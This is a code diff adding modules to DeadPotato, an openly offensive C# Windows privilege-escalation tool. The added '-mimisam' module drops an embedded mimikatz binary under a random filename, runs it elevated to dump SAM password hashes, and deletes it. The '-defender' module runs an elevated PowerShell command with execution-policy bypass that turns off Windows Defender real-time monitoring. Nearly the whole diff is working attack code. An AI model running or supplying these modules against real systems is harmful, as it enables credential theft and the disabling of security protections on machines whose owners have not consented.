@@ -10,6 +10,10 @@ using System.Security.Principal;
 using SharpToken;
 using System.Text.RegularExpressions;
 using System.Web;
+using System.Reflection;
+using System.Linq;
+using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace DeadPotato
 {
@@ -19,11 +23,16 @@ namespace DeadPotato
         public static bool isInShell;
 
         static void Main(string[] args)
-        {
-            
+        {   
 
             if (args.Length > 0)
             {
+                if (!PrivilegeChecker.IsSeImpersonatePrivilegeEnabled()) 
+                {
+                    UI.printColor($"(<darkred>-</darkred>) The <darkgray>SeImpersonatePrivilege</darkgray> appears to be <darkred>DISABLED</darkred>.\nDo you want to proceed? (Y/n): ");
+                    if (Console.ReadLine().ToLower() != "y") { UI.printColor($"(<darkred>-</darkred>) Exiting..."); Environment.Exit(0); }
+                }
+
                 switch(args[0])
                 {
                     case "-cmd":
@@ -160,6 +169,77 @@ namespace DeadPotato
                         Environment.Exit(0);
                         break;
 
+                    
+                    case "-mimisam":
+
+                        if (args.Length != 1)
+                        {
+                            UI.printColor($"(<darkred>-</darkred>) This command takes no arguments.\nUsage: <yellow>deadpotato.exe -mimisam</yellow>");
+                            Environment.Exit(0);
+                        }
+
+                        UI.printBanner();
+
+                        string fileName = new string(Enumerable.Range(0, 8).Select(_ => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[new Random(Guid.NewGuid().GetHashCode()).Next(62)]).ToArray())  + ".exe";
+                        UI.printColor($"(<darkred>*</darkred>) Attempting to write <darkgray>{fileName}</darkgray> (mimikatz) in the current directory...");
+
+                        try
+                        {
+                            File.WriteAllBytes(fileName, Properties.Resources.mimikatz);
+                            UI.printColor($"\n(<darkgreen>+</darkgreen>) File written. Attempting to dump SAM...\n\n");
+                            elevateCommand($"{fileName} privilege::debug \"lsadump::sam\" exit", false);
+                            UI.printColor($"\n(<darkgreen>+</darkgreen>) Removing mimikatz and exiting.");
+                            File.Delete(fileName);
+                        }
+                        catch
+                        {
+                            UI.printColor($"\n(<darkred>-</darkred>) An error occurred. Exiting.");
+                            Environment.Exit(0);
+                        }
+
+                        break;
+
+
+                    case "-defender":
+
+                        if (args.Length != 2)
+                        {
+                            UI.printColor($"(<darkred>-</darkred>) This command takes either <yellow>on</yellow>, <yellow>off</yellow> or <yellow>status</yellow> as arguments.\nUsage: <yellow>deadpotato.exe -defender off</yellow>");
+                            Environment.Exit(0);
+                        }
+
+                        if (args[1].ToLower() != "on" && args[1].ToLower() != "off" && args[1].ToLower() != "status")
+                        {
+                            UI.printColor($"(<darkred>-</darkred>) This command takes either <yellow>on</yellow> or <yellow>off</yellow> as arguments.\nUsage: <yellow>deadpotato.exe -defender off</yellow>");
+                            Environment.Exit(0);
+                        }
+
+                        UI.printBanner();
+
+                        if (args[1].ToLower() == "status")
+                        {
+                            UI.printColor($"(<darkred>*</darkred>) Running status checks...");
+                            UI.printColor($"\n(<darkred>*</darkred>) Windows Defender seems to be {(isWindowsDefenderRunning() ? "<darkgreen>ENABLED</darkgreen>" : "<darkred>DISABLED</darkred>")}. Exiting.\n");
+                            Environment.Exit(0);
+                        }
+
+                        bool enabled = (args[1].ToLower() == "on");
+
+                        if(Process.GetProcessesByName("MsMpEng").Length == 0)
+                        {
+                            UI.printColor($"\n(<darkred>-</darkred>) Windows Defender does not seem to be running.");
+                            Environment.Exit(0);
+                        }
+
+                        UI.printColor($"(<darkred>*</darkred>) Attempting to {(enabled ? "ENABLE" : "DISABLE")} Windows Defender...\n");
+
+                        elevateCommand($"powershell -ExecutionPolicy Bypass -Command \"Set-MpPreference -DisableRealtimeMonitoring {(enabled ? "$false" : "$true")}\"", false);
+
+                        UI.printColor($"(<darkred>*</darkred>) Running status checks...");
+                        UI.printColor($"\n(<darkred>*</darkred>) Windows Defender seems to be {(isWindowsDefenderRunning() ? "<darkgreen>ENABLED</darkgreen>" : "<darkred>DISABLED</darkred>")}. Exiting.\n");
+                        Environment.Exit(0);
+                        break;
+
 
                     default:
                         UI.printColor($"(<darkred>-</darkred>) Invalid module: \"<yellow>{args[0]}</yellow>\".\nChoose between <yellow>-cmd</yellow>, <yellow>-rev</yellow>, and the following listed in the help page below:");
@@ -174,13 +254,62 @@ namespace DeadPotato
 
         }
 
-        public static void elevateCommand(string command)
+        public static void WriteResourceToFile(string resourceName, string fileName)
+        {
+            var assembly = Assembly.GetExecutingAssembly();
+            using (Stream resourceStream = assembly.GetManifestResourceStream(resourceName))
+            {
+                if (resourceStream == null)
+                {
+                    throw new ArgumentException($"Resource '{resourceName}' not found.");
+                }
+
+                using (FileStream fileStream = new FileStream(fileName, FileMode.Create, FileAccess.Write))
+                {
+                    resourceStream.CopyTo(fileStream);
+                }
+            }
+        }
+
+        public static bool isWindowsDefenderRunning()
+        {
+            var path = @"SOFTWARE\Microsoft\Windows Defender\Real-Time Protection";
+            var key = "DisableRealtimeMonitoring";
+            var regkey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+            if (regkey != null)
+            {
+                var subkey = regkey.OpenSubKey(path);
+                var val = subkey.GetValue(key);
+                if (val != null && val is Int32)
+                {
+                    var value = (int)val;
+                    if (value == 1)
+                    {
+                        return false;
+                    }
+                    else
+                    {
+                        return true;
+                    }
+                }
+                else
+                {
+                    return true;
+                }
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        public static void elevateCommand(string command, bool displayBanner = true)
         {
             TextWriter ConsoleWriter = Console.Out;
 
             try
             {
-                if (!Program.isInShell) UI.printBanner();
+                if (!Program.isInShell && displayBanner) UI.printBanner();
                 GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
 
                 if (verbose)
